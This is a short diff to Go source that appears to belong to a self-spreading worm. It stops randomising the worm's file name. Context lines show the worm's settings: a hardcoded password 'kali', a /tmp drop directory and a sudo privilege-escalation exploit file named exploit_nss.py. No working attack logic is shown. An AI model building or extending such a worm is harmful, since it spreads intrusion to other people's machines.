@@ -5,8 +5,8 @@ import (
 	"log"
 	"time"
 	"bytes"
-	"strconv"
-	"math/rand"
+	//"strconv"
+	//"math/rand"
 	"os"
 	"bufio"
 	//"fmt"
@@ -17,7 +17,7 @@ var (
 	password = "kali"
 	worm_dir = "/tmp"
 	sudo_exploit_filename = "exploit_nss.py"
-	worm_filename = "worm" + strconv.Itoa(rand.Intn(3))
+	worm_filename = "worm"// + strconv.Itoa(rand.Intn(3))
 	timeout = time.Minute
 )
 
